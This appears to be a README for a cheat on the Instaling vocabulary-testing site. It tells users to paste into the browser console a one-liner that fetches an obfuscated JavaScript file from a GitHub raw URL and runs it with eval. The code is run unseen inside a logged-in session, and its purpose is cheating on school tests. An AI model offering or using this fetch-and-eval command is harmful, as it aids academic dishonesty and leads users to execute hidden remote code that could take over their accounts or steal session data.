It should work in Test and Classic mode.

1. Join Instaling
2. Open console and paste this

fetch("https://raw.githubusercontent.com/vol3n/instaling-cheat/main/obfuscated.js")
.then((res) => res.text()
.then((t) => eval(t)))
